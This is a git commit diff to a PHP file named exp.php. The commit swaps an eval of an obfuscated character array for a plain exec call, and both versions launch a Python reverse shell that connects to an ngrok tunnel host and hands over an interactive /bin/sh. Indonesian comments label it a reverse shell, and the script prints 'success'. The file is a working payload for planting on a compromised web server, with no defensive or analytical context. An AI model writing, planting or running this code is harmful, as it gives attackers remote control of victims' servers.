e031163eab1adc9d746782a1c03ed508ba3f171d
Neuro <104827484+neurodie@users.noreply.github.com>
2025-01-01 23:03:53 -0300

    Update exp.php

--- exp.php
+++ exp.php
@@ -1,5 +1,8 @@
 <?php
-$cmd = array("n", "o", "h", "u", "p", " ", "/usr/bin/python ", "-c ", "'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"0.tcp.ap.ngrok.io\",15178)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"]);' &");
-$cmd = implode($cmd);
-eval($cmd);
+// Mengeksekusi perintah Python menggunakan nohup untuk menjalankan reverse shell
+$command = "nohup /usr/bin/python -c 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"0.tcp.ap.ngrok.io\",18947)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"]);' &";
+exec($command);
+
+// Menampilkan pesan sukses
+echo "success";
 ?>
